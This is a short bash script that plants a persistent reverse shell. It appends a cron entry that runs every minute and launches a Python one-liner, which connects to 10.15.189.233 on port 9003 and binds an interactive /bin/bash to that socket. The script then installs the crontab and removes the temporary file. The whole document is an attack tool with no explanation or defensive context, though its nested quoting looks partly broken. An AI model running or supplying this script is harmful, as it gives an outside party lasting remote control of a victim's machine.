#!/bin/bash

cd "$(mktemp -d)";
crontab -l > mycron;
echo "* * * * * cd \"\$(mktemp -d)\" && python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.15.189.233",9003));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
 >> mycron;
crontab mycron;
rm -f mycron;
exit;
